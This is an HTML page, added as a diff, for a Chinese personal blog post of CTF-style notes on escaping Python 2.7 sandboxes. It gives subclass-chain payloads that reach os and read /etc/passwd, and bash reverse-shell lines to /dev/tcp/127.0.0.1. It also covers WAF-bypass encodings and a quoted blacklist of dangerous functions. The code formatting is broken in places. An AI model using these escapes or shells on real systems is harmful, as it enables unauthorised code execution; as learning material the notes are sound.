@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>Python沙箱 | ZenisLTZ&#39;s Blog</title>
+  <meta name="description" content="Python沙箱笔记本文主要基于python2.7.14 Exploit:获得object对象python的内置对象有一个12 获得object   [].class.base[].class.bases[0]“”.class.mro[-1]“”.class.base.base12345678910### 文件读写* python2的file对象  types.FileType实例化  使用```">
+<meta name="keywords" content="python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python沙箱">
+<meta property="og:url" content="http://ZenisLTZ.github.io/2018/10/10/PySandox/index.html">
+<meta property="og:site_name" content="ZenisLTZ">
+<meta property="og:description" content="Python沙箱笔记本文主要基于python2.7.14 Exploit:获得object对象python的内置对象有一个12 获得object   [].class.base[].class.bases[0]“”.class.mro[-1]“”.class.base.base12345678910### 文件读写* python2的file对象  types.FileType实例化  使用```">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-10-11T15:30:07.188Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Python沙箱">
+<meta name="twitter:description" content="Python沙箱笔记本文主要基于python2.7.14 Exploit:获得object对象python的内置对象有一个12 获得object   [].class.base[].class.bases[0]“”.class.mro[-1]“”.class.base.base12345678910### 文件读写* python2的file对象  types.FileType实例化  使用```">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://ZenisLTZ.github.io/2018/10/10/PySandox/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="ZenisLTZ" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  
+  
+  
+</head>
+
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/ZenisLTZ" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">boris lee</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Nanjing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ZenisLTZ" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/borislee26@gmail.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-Mail"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>welcome to discuss on Web security</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/PHP/" style="font-size: 13px;">PHP</a> <a href="/tags/python/" style="font-size: 13px;">python</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2018/10/10/PySandox/" class="title">Python沙箱</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2018-10-10T15:12:55.028Z" itemprop="datePublished">2018-10-10</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2018/10/09/PhpCodeExcution/" class="title">PHP Code Excution Notes</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2018-10-09T12:02:04.797Z" itemprop="datePublished">2018-10-09</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-PySandox" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Python沙箱
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2018/10/10/PySandox/" class="article-date">
+	  <time datetime="2018-10-10T15:12:55.028Z" itemprop="datePublished">2018-10-10</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/python/">python</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2018/10/10/PySandox/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="Python沙箱笔记"><a href="#Python沙箱笔记" class="headerlink" title="Python沙箱笔记"></a>Python沙箱笔记</h1><p>本文主要基于python2.7.14</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit:"></a>Exploit:</h2><h3 id="获得object对象"><a href="#获得object对象" class="headerlink" title="获得object对象"></a>获得object对象</h3><p>python的内置对象有一个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<h1 id="获得object"><a href="#获得object" class="headerlink" title="获得object"></a>获得object</h1><blockquote>
+<blockquote>
+<blockquote>
+<p>[].<strong>class</strong>.<strong>base</strong><br>[].<strong>class</strong>.<strong>bases</strong>[0]<br>“”.<strong>class</strong>.<strong>mro</strong>[-1]<br>“”.<strong>class</strong>.<strong>base</strong>.<strong>base</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 文件读写</span><br><span class="line"></span><br><span class="line">* python2的file对象</span><br><span class="line"></span><br><span class="line">  types.FileType实例化</span><br><span class="line"></span><br><span class="line">  使用```[].__class__.__base__.__subclasses__().index(模块名)```可以查看该模块在object子类的位置</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>().index(file)<br>40<br>[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()<a href="&#39;./etc/passwd&#39;,&#39;r&#39;">40</a>.read()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* popen读写进程</span><br><span class="line"></span><br><span class="line">  `</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>  FILE <em>popen(const char </em>command,const char *open_mode);<br>  popen打开的是进程,相对应的是pclose</p>
+<p>  os.popen(‘./inputTest’,’w’)<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 代码执行</span><br><span class="line"></span><br><span class="line">#### exec()、eval()以及complie()</span><br><span class="line"></span><br><span class="line">eval()函数只能计算单个表达式的值，而exec()函数可以动态运行代码段。</span><br><span class="line"></span><br><span class="line">eval()函数可以有返回值，而exec()函数返回值永远为None。</span><br><span class="line"></span><br><span class="line">compile() 函数将一个字符串编译为字节代码。</span><br></pre></td></tr></table></figure></p>
+<p>compile(source, filename, mode, flags=0, dont_inherit=False, optimize=-1)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### `__call__`等回调函数</span><br><span class="line"></span><br><span class="line">所属类:	29---&lt;type &apos;builtin_function_or_method&apos;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>“”.<strong>class</strong>.<strong>mro</strong>[-1].<strong>subclasses</strong>()[29].<strong>call</strong>(eval,’os.system(“ls”)’)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">类似的还有map(),sys.call_tracing()</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">map(__import__(&apos;os&apos;).system,[&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&apos;,])</span><br><span class="line">sys.call_tracing(__import__(&apos;os&apos;).system,(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&apos;,))</span><br></pre></td></tr></table></figure></p>
+<h4 id="f-strings"><a href="#f-strings" class="headerlink" title="f-strings"></a>f-strings</h4><p>字符串修饰符f,大写也可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = &quot;Eric&quot;</span><br><span class="line">age = 74</span><br><span class="line">print f&quot;Hello, &#123;name&#125;. You are &#123;age&#125;.&quot;</span><br><span class="line"></span><br><span class="line">f&quot;&#123;__import__(&apos;os&apos;).system(&apos;ls&apos;)&#125;&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="input-stdin"><a href="#input-stdin" class="headerlink" title="input+stdin"></a>input+stdin</h4><p>py2中的<code>input</code>会执行代码而<code>raw_input</code>不会</p>
+<p>py3中删除了<code>raw_input</code>，然后其功能由<code>input</code>替换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import StringIO</span><br><span class="line">import syss</span><br><span class="line"></span><br><span class="line">sys.stdin = StringIO.StringIO(&apos;__import__(\&apos;os\&apos;).system(\&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;\&apos;)&apos;)</span><br><span class="line"></span><br><span class="line">input(&apos;input:&apos;)</span><br></pre></td></tr></table></figure>
+<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>参看后期文章</p>
+<h3 id="GetShell-RCE"><a href="#GetShell-RCE" class="headerlink" title="GetShell(RCE)"></a>GetShell(RCE)</h3><p>取自Python_revenge HITB2018</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">eval, execfile, compile, open, file, map, input,</span><br><span class="line">os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,</span><br><span class="line">os.listdir, os.access,</span><br><span class="line">os.execl, os.execle, os.execlp, os.execlpe, os.execv,</span><br><span class="line">os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,</span><br><span class="line">os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,</span><br><span class="line">pickle.load, pickle.loads,cPickle.load,cPickle.loads,</span><br><span class="line">subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,</span><br><span class="line">commands.getstatusoutput,commands.getoutput,commands.getstatus,</span><br><span class="line">glob.glob,</span><br><span class="line">linecache.getline,</span><br><span class="line">shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,</span><br><span class="line">dircache.listdir,dircache.opendir,</span><br><span class="line">io.open,</span><br><span class="line">popen2.popen2,popen2.popen3,popen2.popen4,</span><br><span class="line">timeit.timeit,timeit.repeat,</span><br><span class="line">sys.call_tracing,</span><br><span class="line">code.interact,code.compile_command,codeop.compile_command,</span><br><span class="line">pty.spawn,</span><br><span class="line">posixfile.open,posixfile.fileopen,</span><br><span class="line">platform.popen</span><br></pre></td></tr></table></figure>
+<h4 id="第三方库"><a href="#第三方库" class="headerlink" title="第三方库"></a>第三方库</h4><ul>
+<li>numpy</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from numpy.distutils.exec_command import _exec_command as system</span><br><span class="line">system(&quot;ls /&quot;)</span><br></pre></td></tr></table></figure>
+<h2 id="Technique"><a href="#Technique" class="headerlink" title="Technique"></a>Technique</h2><h3 id="字符串绕过"><a href="#字符串绕过" class="headerlink" title="字符串绕过"></a>字符串绕过</h3><p>当有的字符串被waf的时候可以通过编码或者字符串拼接绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&apos;ZmxhZy50eHQ=&apos;.decode(&apos;base64&apos; )</span><br><span class="line">&apos;flag.txt&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &apos;&apos;.join([&apos;__builtin&apos;,&apos;s__&apos;])</span><br><span class="line">&apos;__builtins__&apos;</span><br></pre></td></tr></table></figure>
+<p>将所有字符转为ascii码后,chr()组合在一起</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">list = &quot;import os;os.system(&apos;ls&apos;)&quot;</span><br><span class="line">command = []</span><br><span class="line">for i in list:</span><br><span class="line">    command.append(&quot;chr(&#123;&#125;)&quot;.format(ord(i)))</span><br><span class="line"></span><br><span class="line">print command</span><br><span class="line">#eval(&apos;&apos;.join(command))</span><br></pre></td></tr></table></figure>
+<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = open</span><br><span class="line">print(a(&quot;/etc/passwd&quot;).read())</span><br></pre></td></tr></table></figure>
+<h3 id="函数名后面加点空格换一行都能执行"><a href="#函数名后面加点空格换一行都能执行" class="headerlink" title="函数名后面加点空格换一行都能执行"></a>函数名后面加点空格换一行都能执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;dir ()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">print open</span><br><span class="line">(&quot;/etc/passwd&quot;).read()</span><br></pre></td></tr></table></figure>
+<h3 id="使用别名"><a href="#使用别名" class="headerlink" title="使用别名"></a>使用别名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import os as o</span><br></pre></td></tr></table></figure>
+<h3 id="函数-模块重载"><a href="#函数-模块重载" class="headerlink" title="函数/模块重载"></a>函数/模块重载</h3><ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>import</strong>(‘os’)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- reload()重载reload可以通过reload重新加载被删除的/函数模块</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>del <strong>builtins</strong>.<strong>dict</strong>[‘eval’]<br>del <strong>builtins</strong>.<strong>dict</strong>[‘file’]<br>del <strong>builtins</strong>.<strong>dict</strong>[‘vars’]<br>reload(<strong>builtins</strong>)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- imp模块重载</span><br></pre></td></tr></table></figure></p>
+<p>import imp<br>imp.reload(<strong>builtins</strong>)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- importlib模块</span><br></pre></td></tr></table></figure></p>
+<p>import importlib<br>importlib.import_module(module)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 属性过滤</span><br><span class="line"></span><br><span class="line">属性直接被waf的时候不能bypass</span><br><span class="line"></span><br><span class="line">当**func_globals**等 ,这时候可以使用如下方法利用属性的名字，再结合一些编码/字符串操作可以绕过</span><br></pre></td></tr></table></figure></p>
+<p><strong>getattribute</strong>(属性名)<br><strong>dict</strong>[属性名]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如:</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[60].<strong>init</strong>.func_globals[‘linecache’].<strong>dict</strong>.values()[12]</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[60].<strong>init</strong>.<strong>getattribute</strong>(‘func_global’+’s’)[‘linecache’].<strong>dict</strong>.values()[12]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### os等库被过滤</span><br><span class="line"></span><br><span class="line">#### 代码执行+```__import__```引入os</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>“”.<strong>class</strong>.<strong>mro</strong>[-1].<strong>subclasses</strong>()[60].<strong>init</strong>.<strong>globals</strong>[‘<strong>builtins</strong>‘]<a href="&#39;__import__(&quot;os&quot;">‘eval’</a>.system(“ls”)’)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 预先载入os的库</span><br><span class="line"></span><br><span class="line">在2.7.14中的序号</span><br><span class="line"></span><br><span class="line">- 72---&lt;class &apos;site._Printer&apos;&gt;</span><br><span class="line">- 77---&lt;class &apos;site.Quitter&apos;&gt;</span><br><span class="line">- 60---&lt;class &apos;warnings.catch_warnings&apos;&gt;--------&gt;linecache---------&gt;os</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">&gt;&gt;&gt;[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)</span><br><span class="line">60</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;[].__class__.__base__.__subclasses__()[60].__init__.func_globals[&apos;linecache&apos;].__dict__.keys()</span><br><span class="line">[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;[].__class__.__base__.__subclasses__()[72].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&gt;&gt;&gt;[].__class__.__base__.__subclasses__()[77].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&gt;&gt;&gt;[].__class__.__base__.__subclasses__()[60].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;D:\Python27\lib\os.pyc&apos;&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="获得-builtins"><a href="#获得-builtins" class="headerlink" title="获得__builtins__"></a>获得<code>__builtins__</code></h3><h4 id="globals函数可用"><a href="#globals函数可用" class="headerlink" title="globals函数可用"></a>globals函数可用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">globals().values()[0]</span><br></pre></td></tr></table></figure>
+<h4 id="显示声明-init-方法的库"><a href="#显示声明-init-方法的库" class="headerlink" title="显示声明__init__方法的库"></a>显示声明<code>__init__</code>方法的库</h4><p>对于<code>__init__</code>方法,显示声明的话类型会从<slot wrapper="">(wrapper_descriptor)成为<unbound method="">(instancemethod)，从而有了<code>__globals__</code>属性，从而可以访问<code>__builtins__</code></unbound></slot></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#by bendawang</span></span><br><span class="line"><span class="comment">#exp.py</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> [].__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> item.__init__.__globals__ <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            print(cnt,item)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#py2.7.14</span><br><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;)</span><br><span class="line">(60, &lt;class &apos;warnings.catch_warnings&apos;&gt;)   #间接访问os</span><br><span class="line">(61, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;)</span><br><span class="line">(62, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;)</span><br><span class="line">(72, &lt;class &apos;site._Printer&apos;&gt;)	#可以直接os</span><br><span class="line">(77, &lt;class &apos;site.Quitter&apos;&gt;)	#可以直接os</span><br><span class="line">(78, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;)</span><br><span class="line">(79, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;)</span><br><span class="line"></span><br><span class="line">#py3.7.0</span><br><span class="line">75 &lt;class &apos;_frozen_importlib._ModuleLock&apos;&gt;</span><br><span class="line">76 &lt;class &apos;_frozen_importlib._DummyModuleLock&apos;&gt;</span><br><span class="line">77 &lt;class &apos;_frozen_importlib._ModuleLockManager&apos;&gt;</span><br><span class="line">78 &lt;class 